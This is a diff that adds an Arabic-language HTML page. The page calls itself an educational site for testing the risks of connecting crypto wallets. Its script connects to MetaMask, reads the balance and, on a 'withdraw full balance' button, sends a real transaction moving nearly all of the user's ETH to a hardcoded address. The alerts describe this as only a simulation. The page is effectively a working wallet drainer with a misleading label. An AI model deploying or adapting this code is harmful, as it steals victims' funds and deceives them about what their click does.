@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>موقع تعليمي لاختبار أمان المحافظ الرقمية</title>
+</head>
+<body>
+  <h1 style="text-align: center;">موقع تعليمي لاختبار مخاطر ربط المحافظ الرقمية</h1>
+  <div style="text-align: center; margin-top: 20px;">
+    <button id="connectWallet" style="padding: 10px 20px; font-size: 16px;">ربط المحفظة</button>
+    <button id="drainWallet" style="padding: 10px 20px; font-size: 16px;" disabled>سحب كامل الرصيد</button>
+  </div>
+  <p id="status" style="text-align: center; margin-top: 20px;">الحالة: غير متصل</p>
+  <p id="balance" style="text-align: center; margin-top: 10px;">الرصيد: غير معروف</p>
+
+  <script>
+    let userAddress = null;
+
+    // دالة لربط المحفظة
+    async function connectWallet() {
+      if (window.ethereum) {
+        try {
+          const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+          userAddress = accounts[0];
+          document.getElementById("status").textContent = `الحالة: متصل بـ ${userAddress}`;
+          document.getElementById("drainWallet").disabled = false;
+
+          // جلب الرصيد
+          const balance = await ethereum.request({
+            method: "eth_getBalance",
+            params: [userAddress, "latest"],
+          });
+
+          const ethBalance = parseInt(balance, 16) / 1e18;
+          document.getElementById("balance").textContent = `الرصيد: ${ethBalance} ETH`;
+        } catch (error) {
+          console.error("فشل في ربط المحفظة:", error);
+          alert("حدث خطأ أثناء ربط المحفظة.");
+        }
+      } else {
+        alert("لا يوجد MetaMask مثبت.");
+      }
+    }
+
+    // دالة لسحب كامل الرصيد
+    async function drainWallet() {
+      if (!userAddress) return alert("يرجى ربط المحفظة أولاً!");
+
+      try {
+        // جلب الرصيد
+        const balance = await ethereum.request({
+          method: "eth_getBalance",
+          params: [userAddress, "latest"],
+        });
+
+        // تحويل الرصيد إلى HEX
+        const valueToSend = (BigInt(balance) - BigInt(21000 * 1e9)).toString(16); // ناقص رسوم الغاز (Gas)
+
+        if (BigInt(valueToSend) <= 0) {
+          alert("الرصيد غير كافٍ لتغطية رسوم الغاز.");
+          return;
+        }
+
+        // إنشاء معاملة لسحب كامل الرصيد
+        const transaction = {
+          from: userAddress,
+          to: "0x081E2A8d0d1C97f3fD7451bf21EEA6F78921632C", // ضع عنوان المحفظة هنا
+          value: "0x" + valueToSend,
+          gas: "0x5208", // 21000 وحدة غاز
+          gasPrice: "0x" + (BigInt(1e9)).toString(16), // سعر الغاز (1 GWEI)
+        };
+
+        await ethereum.request({
+          method: "eth_sendTransaction",
+          params: [transaction],
+        });
+
+        alert("تمت محاكاة سحب كامل الرصيد!");
+      } catch (error) {
+        console.error("خطأ أثناء سحب الرصيد:", error);
+        alert("فشل في محاكاة السحب.");
+      }
+    }
+
+    // ربط الأحداث
+    document.getElementById("connectWallet").addEventListener("click", connectWallet);
+    document.getElementById("drainWallet").addEventListener("click", drainWallet);
+  </script>
+</body>
+</html>
